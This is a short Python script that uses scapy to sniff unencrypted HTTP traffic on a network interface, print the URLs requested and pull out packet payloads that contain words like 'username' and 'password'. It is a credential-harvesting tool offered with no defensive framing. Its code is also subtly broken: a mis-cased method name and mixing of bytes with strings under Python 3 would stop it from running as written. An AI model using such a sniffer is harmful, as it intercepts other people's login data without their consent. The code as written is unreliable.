#!/usr/bin/python3


import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="port 80")
    pass

def get_urll(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
def get_login_info(packet):
    if packet.hasLayer(scapy.Raw):
        # print(packet[scapy.Raw].load)
        keywords = ['username', 'password', 'user', 'login', 'pass']
        load = packet[scapy.Raw].load
        for keyword in keywords:
            if keyword in load :
                return load


def process_sniffed_packet(packet):
    if packet.hasLayer(http.HTTPRequest):
        # print(packet.show()) #will show all the layer of the packet
        url = get_urll(packet)
        print("[+] HTTP Request url >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info)


        
    pass

interface = "eth0"
sniff(interface)